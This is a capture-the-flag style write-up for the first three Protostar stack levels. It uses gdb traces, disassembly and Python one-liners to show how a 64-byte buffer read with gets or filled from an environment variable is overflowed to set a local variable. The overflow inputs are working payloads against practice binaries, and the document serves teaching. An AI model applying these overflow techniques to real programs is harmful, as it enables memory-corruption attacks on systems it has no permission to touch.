# Writeups for protostar

## stack0

- First level introduces the concept of stack overflow, and how stack overflow can modify local variables.
- Look at the source code for stack0, and see that this program when executed, waits for our input and stores it into a buffer that is 64 bytes long.
- However it uses `gets` function which is really __insecure__.
- Giving the input larger than 64 bytes, modifies the `modified` variable:

```sh
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD
you have changed the 'modified' variable
```

### Low level stuff

- Let's run this program in `gdb`:

```asm
(gdb) disas main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```

- Here's the assembly instruction that sets `modified` variable to 0:

```asm
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
```

- Set a breakpoint on gets:

```sh
(gdb) b *0x0804840c
Breakpoint 1 at 0x804840c: file stack0/stack0.c, line 11.
```

- Let's define a __hook__ in `gdb` which will execute some commands whenever it hits breakpoint:

```sh
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>i r
>x/24wx $esp
>x/2i $eip
>end
```

- This prints registers, the stack and next two instructions on every breakpoint.

```sh
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
eax            0x0      0
ecx            0xbffffc7c       -1073742724
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffc60       0xbffffc60
ebp            0xbffffcc8       0xbffffcc8
esi            0x0      0
edi            0x0      0
eip            0x8048415        0x8048415 <main+33>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffffc60:     0xbffffc7c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffffc70:     0xb7fd7ff4      0xb7ec6165      0xbffffc88      0x41414141
0xbffffc80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc90:     0x41414141      0x41414141      0x41414141      0x08048400
0xbffffca0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffffcc8
0xbffffcb0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
---Type <return> to continue, or q <return> to quit---
0x8048415 <main+33>:    test   eax,eax
0x8048417 <main+35>:    je     0x8048427 <main+51>

Breakpoint 2, 0x08048415 in main (argc=1, argv=0xbffffd74) at stack0/stack0.c:13
13      in stack0/stack0.c
```

- Notice i've placed a second breakpoint on `0x08048415`.
- Also notice that our stack gets filled with some `0x41`, but, `modified` still stays 0:

```sh
(gdb) x/xw $esp+0x5c
0xbffffcbc:     0x00000000
```

- You can actually see `modified` in the previous gdb output on the stack, it's the last entry.
- Count it manually, and you will see that you need to supply at least 64 long input to just reach `modified` variable in memory.
- After those 64 characters even if you supply one more character, you overwrite the `modified` variable.
- So let's input a pattern of characters which we can recognize (`0x44` is ascii 'D')

```sh
(gdb) c
Continuing.
AAAAAAAABBBBCCCCDDDDAAAABBBBCCCCDDDDAAAABBBBCCCCDDDDAAAABBBBCCCCDDDD
eax            0x44444444       1145324612
ecx            0xbffffc7c       -1073742724
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffffc60       0xbffffc60
ebp            0xbffffcc8       0xbffffcc8
esi            0x0      0
edi            0x0      0
eip            0x8048415        0x8048415 <main+33>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffffc60:     0xbffffc7c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffffc70:     0xb7fd7ff4      0xb7ec6165      0xbffffc88      0x41414141
0xbffffc80:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffffc90:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffffca0:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffffcb0:     0x41414141      0x42424242      0x43434343      0x44444444
---Type <return> to continue, or q <return> to quit---
0x8048415 <main+33>:    test   eax,eax
0x8048417 <main+35>:    je     0x8048427 <main+51>

Breakpoint 3, 0x08048415 in main (argc=1, argv=0xbffffd74) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) x/s $esp+0x5c
0xbffffcbc:      "DDDD"
(gdb) c
Continuing.
you have changed the 'modified' variable
```

## stack1

- From the task description:
> This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

- This should also be easy, let's try inputting 64 A's and DCBA respecting the little endian.
- Generate the input with python:

```py
$ python3 -c 'print("\x41" * 64 + "\x44\x43\x42\x41")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA
```

- Feed it the input:

```sh
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA
Try again, you got 0x41424344
```

- That's cool, but we need to set `modified` variable to `0x61626364`.

```py
$ python3 -c 'print("\x41" * 64 + "\x64\x63\x62\x61")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
```

- And...

```sh
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```

## stack2

- This challenge introduces concepts of using environment variable to cause a stack overflow.
- `getenv` is not the most secure function in C.

- Solution is next:

```sh
$ export GREENIE="$(python -c 'print("A"*64+"\x0a\x0d\x0a\x0d")')"
$ echo $GREENIE
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./stack2
you have correctly modified the variable
```
